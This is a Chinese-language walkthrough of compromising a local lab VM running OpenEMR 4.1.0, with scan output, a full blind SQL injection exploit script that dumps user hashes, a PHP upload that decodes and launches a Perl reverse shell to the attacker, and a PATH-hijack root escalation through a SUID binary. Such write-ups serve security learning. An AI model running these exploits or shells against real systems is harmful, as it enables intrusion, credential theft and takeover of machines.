```
nmap -sP  192.168.0.0/24
```

```
└─# nmap --top-port 1000 -sV -A 192.168.0.102 
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
MAC Address: 00:0C:29:87:74:95 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/28%OT=21%CT=1%CU=44192%PV=Y%DS=1%DC=D%G=Y%M=000C29%
OS:TM=63847A9B%P=x86_64-pc-linux-gnu)SEQ(SP=CC%GCD=1%ISR=D1%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5
OS:=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=
OS:3890)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW6%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M5B4ST1
OS:1NW6%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
Network Distance: 1 hop
Service Info: OS: Unix
```

### 对80端口下手：

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
└─# nikto -host 192.168.0.102
```

```
/css                  (Status: 301) [Size: 339] [--> http://192.168.0.102/css/]
/favicon.ico          (Status: 200) [Size: 1406]
/favicon              (Status: 200) [Size: 1406]
/fonts                (Status: 301) [Size: 341] [--> http://192.168.0.102/fonts/]
/gitweb               (Status: 301) [Size: 342] [--> http://192.168.0.102/gitweb/]
/images               (Status: 301) [Size: 342] [--> http://192.168.0.102/images/]
/index.html           (Status: 200) [Size: 5031]
/index                (Status: 200) [Size: 5031]
/js                   (Status: 301) [Size: 338] [--> http://192.168.0.102/js/]
/phpMyAdmin           (Status: 403) [Size: 59]
/robots.txt           (Status: 200) [Size: 620]
/server-info          (Status: 403) [Size: 999]
/server-status        (Status: 403) [Size: 999]
/vendor               (Status: 301) [Size: 342] [--> http://192.168.0.102/vendor/]

+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 01:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```

发现robots.txt，还有web路径/cgi-bin/test.cgi貌似有漏洞

```
# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
# exclude help system from robots
User-agent: *
Disallow: /manual/
Disallow: /manual-2.2/
Disallow: /addon-modules/
Disallow: /doc/
Disallow: /images/
# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
Disallow: /all_our_e-mail_addresses
# same idea here...
Disallow: /admin/
# but allow htdig to index our doc-tree
#User-agent: htdig
#Disallow:
# disallow stress test
user-agent: stress-agent
Disallow: /
```

换个web上下文字典康康，发现了

http://192.168.0.102/openemr

<img src=".\图片\Snipaste_2022-11-28_19-36-18.png" alt="Snipaste_2022-11-28_19-36-18" style="zoom:80%;" />

```
└─# searchsploit OpenEMR
Openemr-4.1.0 - SQL Injection                                                  php/webapps/17998.txt         
```

<img src=".\图片\Snipaste_2022-11-28_19-48-11.png" alt="Snipaste_2022-11-28_19-48-11" style="zoom:80%;" />

从这里说一下，我没连在一起做，今天靶机和kali的ip交换了一下，靶机是192.168.0.103，kali是192.168.0.102

```
└─# locate php/webapps/17998.txt                                                                              /usr/share/exploitdb/exploits/php/webapps/17998.txt
```

```
└─# cat /usr/share/exploitdb/exploits/php/webapps/49742.py                                                   
# Exploit Title: OpenEMR 4.1.0 - 'u' SQL Injection
# Date: 2021-04-03
# Exploit Author: Michael Ikua
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
# Version: 4.1.0
# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/

#!/usr/bin/env python3

import requests
import string
import sys

print("""
   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \\
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 
""")

all = string.printable
# edit url to point to your openemr instance
url = "http://192.168.56.106/openemr/interface/login/validateUser.php?u=" 

def extract_users_num():
    print("[+] Finding number of users...")
    for n in range(1,100):
        payload = '\'%2b(SELECT+if((select count(username) from users)=' + str(n) + ',sleep(3),1))%2b\''
        r = requests.get(url+payload)
        if r.elapsed.total_seconds() > 3:
            user_length = n
            break
    print("[+] Found number of users: " + str(user_length))
    return user_length

def extract_users():
    users = extract_users_num()
    print("[+] Extracting username and password hash...")
    output = []
    for n in range(1,1000):
        payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
        #print(payload)
        r = requests.get(url+payload)
        #print(r.request.url)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
    for i in range(1,length+1):
        for char in all:
            payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #print(payload)
            r = requests.get(url+payload)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)


try:
    extract_users()
except KeyboardInterrupt:
    print("")
    print("[+] Exiting...")
    sys.exit() 
```

```
└─# python3 49742.py 
```

```
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
```

MD5解密后admin:ackbar

登录后台后发现可以修改php文件

<img src=".\图片\Snipaste_2022-11-29_13-39-47.png" alt="Snipaste_2022-11-29_13-39-47" style="zoom:60%;" />

这次搞个反弹shell的php脚本

```php
<?php
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
	}
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
			} 
			elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
			} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "your IP";
$yourport = 'your port';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?> 

```

访问[192.168.0.103/openemr/sites/default/statement.inc.php](http://192.168.0.103/openemr/sites/default/statement.inc.php)  得到shell

<img src=".\图片\Snipaste_2022-11-29_13-43-20.png" alt="Snipaste_2022-11-29_13-43-20" style="zoom:80%;" />

### 提权：

```
find / -perm -u=s -type f 2>/dev/null
/usr/bin/healthcheck
```

用strings命令查看二进制

```
bash-4.1$ strings /usr/bin/healthcheck
strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

看见root身份调用 /usr/bin/healthcheck 调用echo 、sleep、ifconfig、du等命令

#### 环境变量劫持提权：

```
bash-4.1$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH

bash-4.1$ cd /tmp
cd /tmp

bash-4.1$ echo '/bin/bash' > du
echo '/bin/bash' > du

bash-4.1$ cat du
cat du
/bin/bash

bash-4.1$ chmod +x du
chmod +x du

bash-4.1$ du
du

bash-4.1$ /usr/bin/healthcheck
/usr/bin/healthcheck
TERM environment variable not set.
System Health Check

Scanning System
eth1      Link encap:Ethernet  HWaddr 00:0C:29:87:74:95  
          inet addr:192.168.0.103  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe87:7495/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:64489 errors:0 dropped:0 overruns:0 frame:0
          TX packets:42253 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:7342237 (7.0 MiB)  TX bytes:9124253 (8.7 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:2718 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2718 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:152208 (148.6 KiB)  TX bytes:152208 (148.6 KiB)


Disk /dev/sda: 10.7 GB, 10737418240 bytes
255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *          63    18876374     9438156   83  Linux
/dev/sda2        18876375    20964824     1044225    5  Extended
/dev/sda5        18876438    20964824     1044193+  82  Linux swap / Solaris
gpg-agent[2467]: error creating `/.gnupg/gpg-agent-info': No such file or directory
[root@localhost tmp]# whoami
whoami
root
```

<img src=".\图片\Snipaste_2022-11-29_14-01-25.png" alt="Snipaste_2022-11-29_14-01-25" style="zoom:80%;" />

### 总结：

查询cms已知漏洞，sql注入的利用，用对应漏洞exp脚本注入或者用sqlmap，最好能自己理解自己写出对应exp。

环境变量劫持提权，发现root身份调用 /usr/bin/healthcheck 调用echo 、sleep、ifconfig、du等命令。于是在/tmp目录下新建命令du，再写上 /bin/bash，写上反弹shell命令应该也可以。再把/tmp目录加入环境变量中。于是我们执行 /usr/bin/healthcheck 时会优先调用 /tmp 下面我们自己建的du命令，于是拿到root的shell。

